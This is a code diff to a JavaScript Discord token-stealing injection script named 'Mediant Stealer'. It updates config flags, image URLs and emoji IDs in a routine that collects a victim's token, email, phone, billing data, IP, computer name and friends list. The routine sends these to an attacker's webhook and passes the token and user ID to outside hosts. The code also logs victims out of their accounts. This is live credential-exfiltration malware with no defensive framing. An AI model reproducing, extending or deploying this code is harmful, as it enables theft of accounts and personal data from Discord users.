@@ -8,6 +8,8 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
+  logout: true,
+  lnotify: true,
   notify : false,
   auto_buy_nitro: false, 
   ping_on_run: true, 
@@ -826,7 +828,7 @@ const FirstTime = async () => {
         params.embeds.push(params2.embeds[0])
     }
     await hooker(params)
-    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
+    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config.lnotify == "true") {
         if (!token) {
             var params = await makeEmbed({
                 title: "Mediant User log out (User not Logged in before)",
@@ -844,8 +846,8 @@ const FirstTime = async () => {
 
             var Billings = getBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/banner.gif"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/Mediant%20Banner.jpg"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -853,59 +855,59 @@ const FirstTime = async () => {
                 title: "Mediant Stealer Victim got logged out",
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
-                    name: "Username <:username:1041634536733290596> ",
+                    name: "Username <:username:1133656006954602607> ",
                     value: `\`${user.username}#${user.discriminator}\``,
                     inline: !0
                 }, {
-                    name: "ID <:iduser:1041634535395307520>",
+                    name: "ID <:id:1133656199078891531>",
                     value: `\`${user.id}\`\n[Copy ID](http://mediant.000.pe/copytoken?p=${user.id})`,
                     inline: !0
                 }, {
-                    name: "Nitro <a:nitro:1041639670288748634>",
+                    name: "Nitro <a:nitro:1133656425516761181>",
                     value: `${GetNitro(Nitro)}`,
                     inline: !0
                 }, {
-                    name: "Badges <:badge:1041634538150973460>",
+                    name: "Badges <a:black:1133656618341503066>",
                     value: `${GetBadges(user.flags)}`,
                     inline: !0
                 }, {
-                    name: "Language <:language:1041640473477001236>",
+                    name: "Language <:languages:1133656890375675974>",
                     value: `${GetLangue(user.locale)}`,
                     inline: !0
                 }, {
-                    name: "NSFW <a:nsfw:1041640474617839616>",
+                    name: "NSFW <:nsfw:1133657209671258193>",
                     value: `${GetNSFW(user.nsfw_allowed)}`,
                     inline: !0
                 }, {
-                    name: "A2F <a:a2f:1040272766982692885>",
+                    name: "A2F <:psy:1054779770883276850>",
                     value: `${GetA2F(user.mfa_enabled)}`,
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Mediant Stealer  <a:mavikirmizi:853238372591599617>](http://mediant.000.pe/)`,
+                    value: `[Mediant Stealer  <:Mediant:1133654846617157673>](http://mediant.000.pe/)`,
                     inline: !0
                 }, {
                     name: "MEDIANT Files",
-                    value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                    value: `[Transfer.sh <:transfer:1133657574634422272>](${config.transfer_link})`,
                     inline: !0
                 }, {
-                    name: "Billing <a:billing:1041641103629234196>",
+                    name: "Billing <a:billing:1133658008082202704>",
                     value: `${Billings}`,
                     inline: !0
                 }, {
-                    name: "Email <a:email:1041639672037785691>",
+                    name: "Email <a:psy:1054779652226416721>",
                     value: `\`${user.email}\``,
                     inline: !0
                 }, {
-                    name: "Phone :mobile_phone:",
+                    name: "Phone <a:psy:1054776823512317953>",
                     value: `\`${user.phone ?? "None"}\``,
                     inline: !0
                 }, {
-                    name: "Bio <a:mavikirmizi:853238372591599617>",
+                    name: "Bio <:bio:1133658374291062814>",
                     value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                     inline: !1
                 }, {
-                    name: "<a:tokens:1041634540537511957> Token",
+                    name: "Token <a:verified:1133658531766214696>",
                     value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                     inline: !1
                 }],
@@ -913,7 +915,7 @@ const FirstTime = async () => {
                 thumbnail: userAvatar
             })
             var params2 = await makeEmbed({
-                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                title: `<a:emoteb:1133658922042011709> Total Friends (${Friends.len})`,
                 color: 2895667,
                 description: Friends.badges,
                 image: userBanner,
@@ -928,9 +930,7 @@ const FirstTime = async () => {
         doTheLogOut = true
         await hooker(params)
     }
-     
     return false
-}
 }
 
 const getBadges = (flags) => {
